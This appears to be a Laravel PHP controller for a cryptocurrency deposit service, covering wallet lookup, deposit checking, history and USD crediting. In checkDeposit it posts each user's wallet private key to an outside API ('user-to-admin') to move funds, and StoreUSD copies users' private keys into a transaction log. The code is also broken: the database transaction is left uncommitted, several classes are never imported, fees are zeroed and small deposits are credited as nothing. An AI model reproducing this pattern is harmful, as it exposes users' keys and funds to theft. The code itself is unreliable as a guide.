<?php

namespace App\Http\Controllers\api;

use App\Http\Controllers\Controller;
use App\Models\Deposit;
use App\Models\Transactions;
use App\Models\User;
use App\Models\UserWalletData;
use App\Service\TransactionService;
use GuzzleHttp\Client;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Mail;
use Exception;

class DepositController extends Controller
{
    protected $transactionService;
    public function __construct(TransactionService $transactionService){
        $this->transactionService = $transactionService;
    }

    public function index(Request $request)
    {
        $user = $request->user();
        $wallet = UserWalletData::where('user_id', $user->id)->select('wallet_address')->first();
        if($wallet){
            return response()->json([
                'success' => true,
                'data' => $wallet->wallet_address,
            ]);
        }
        return response()->json([
            'success' => false,
            'message' => 'Wallet address not found',
        ]);
    }


    public function checkDeposit(Request $request)
    {
        $client = new Client();
        $user = $request->user();

        // Get user wallet address
        $wallet = UserWalletData::where('user_id', $user->id)->select('wallet_address','meta')->first();

        if (!$wallet || empty($wallet->wallet_address)) {
            return response()->json([
                'success' => false,
                'message' => 'Wallet address not found for user.'
            ], 404);
        }

        try {
            $response = $client->get('https://web3.blockmaster.info/api/get-transactions', [
                'query' => [
                    'address' => $wallet->wallet_address,
                ],
            ]);

            $transactions = json_decode($response->getBody()->getContents());

            if (!is_array($transactions)) {
                return response()->json([
                    'success' => false,
                    'message' => 'Invalid response format from transaction API.',
                ], 500);
            }

            DB::beginTransaction();

            foreach ($transactions as $tx) {
                if (
                    isset($tx->hash, $tx->value, $tx->message, $tx->to) &&
                    $tx->message === 'OK' &&
                    strtolower($tx->to) === strtolower($wallet->wallet_address)
                ) {
                    $alreadyExists = Deposit::where('transaction_id', $tx->hash)->exists();

                    if (!$alreadyExists) {
                        $amount = number_format((float) $tx->value, 8, '.', '');
                        // Create Deposit
                        Deposit::create([
                            'transaction_id' => $tx->hash,
                            'amount' => $amount,
                            'user_id' => $user->id,
                        ]);
                        $wallet->increment('amount', $amount);
                        // Update user's wallet balance
                        $user->wallet += $tx->value;
                        $user->save();
                     $res =  $client->post('https://web3.blockmaster.info/api/user-to-admin', [
                           'json' => [
                               "sender_private_key" => $wallet->meta,
                               "sender_address" => $wallet->wallet_address,
                               "client_id" => 'HUHV0XZNK147V76'
                           ]

                       ]);
                     return $res;
                    }
                }
            }

            DB::commit();

            return response()->json([
                'success' => true,
                'message' => 'Deposit check completed successfully.',
            ]);

        } catch (Exception $e) {
            DB::rollBack();

            // Optional logging
            // Log::error("Deposit check failed: " . $e->getMessage());

            return response()->json([
                'success' => false,
                'message' => 'Error while checking deposit: ' . $e->getMessage(),
            ], 500);
        }
    }



    public function history(Request $request)
    {
        $user = $request->user();
        $history = Deposit::where('user_id', $user->id)->orderBy('created_at', 'desc')->paginate(10);
        try {
            $this->checkDeposit($request);
        }catch (\Exception $exception){

        }
        return response()->json([
            'success' => true,
            'data' => $history->items(),
            'total' => $history->total(),
            'current' => $history->currentPage(),
            'next' => $history->nextPageUrl(),
            'previous' => $history->previousPageUrl(),
        ]);
    }


    public function StoreUSD(Request $request)
    {

        //  $client = new Client();



        $update_user = $request->user();

        $client = new Client();
        $response = $client->get('https://web3.blockmaster.info/api/get-transactions', [
            'query' => [
                'address' => $update_user->wallet_address,
                // 'address'=> '0x4d7d4032dd43d20969949e1ebb801064380c3c00',
            ],
        ]);



        $responseBody = json_decode($response->getBody(), true);

        if (is_array($responseBody)) {
            foreach ($responseBody as $deposit) {
                // Check if each deposit contains the keys you are trying to access
                if (isset($deposit['hash'], $deposit['value'], $deposit['gas'], $deposit['gasPrice'])) {
                    $check_deposit = $client->get('https://web3.blockmaster.info/api/get-transaction-status', [
                        'query' => [
                            'hash' => $deposit['hash'],
                            // 'address'=> '0x4d7d4032dd43d20969949e1ebb801064380c3c00',
                        ],
                    ]);
                    $check_depositBody = json_decode($check_deposit->getBody(), true);
                    //  dd($deposit['to']);

                    $hash_check = UsdWallet::where('user_id', Auth::id())->where('txn_id', $deposit['hash'])->first();

                    if ($check_depositBody['is_successful'] == true && $hash_check == null && $deposit['to'] == Auth::user()->deposit_address) {
                        //dd("true");
                        $txn_fee = ($deposit['gas'] * $deposit['gasPrice']) / 1000000000000000000;
                        $txn_fee = 0;
                        //  dd($txn_fee);


                        $amount = ($deposit['value'] - $txn_fee);
                        $bnb_amount = $deposit['value'] - $txn_fee;
                        $txn_id = $deposit['hash'];
                        $uid = User::where('deposit_address', $update_user->deposit_address)->first();
                        //  dd($amount);
                        //DB::Begintransaction();
                        if ($amount >= 10) {
                            $add_deposit = new UsdWallet();
                            $add_deposit->user_id = $uid->id;
                            $add_deposit->amount = $amount;
                            $add_deposit->description = $amount . ' deposited by automatic payment system';
                            $add_deposit->method = 'Deposit';
                            $add_deposit->status = 'approve';
                            $add_deposit->type = 'Credit';
                            $add_deposit->txn_id = $txn_id;
                            $add_deposit->created_at = Carbon::now();
                            $add_deposit->save();
                        } else {
                            $add_deposit = new UsdWallet();
                            $add_deposit->user_id = $uid->id;
                            $add_deposit->amount = 0;
                            $add_deposit->description = $amount . ' deposited by automatic payment system';
                            $add_deposit->method = 'Deposit';
                            $add_deposit->status = 'approve';
                            $add_deposit->type = 'Credit';
                            $add_deposit->txn_id = $txn_id;
                            $add_deposit->created_at = Carbon::now();
                            $add_deposit->save();
                        }

                        $txn = new TransactionTrace();
                        $txn->user_address = Auth::user()->deposit_address;
                        $txn->user_id = Auth::id();
                        $txn->user_private_key = Auth::user()->private_key;
                        $txn->admin_address = '0xa2f33a1391dc84408012beb5aec53114be4fa4ef';
                        $txn->amount = $amount;
                        $txn->save();
                        return response()->json(['success' => 200, 'message' => 'Successfully deposited']);


                        //  dd("success");



                        //  dd($deposit);
                    }

                    //dd($check_deposit['status'],$check_deposit['message']);
                }
            }
            return response()->json(['error' => 400, 'message' => 'No valid deposits found']);
        }




        //  return back()->with('Money_added', 'Successfully deposited');


    }
}
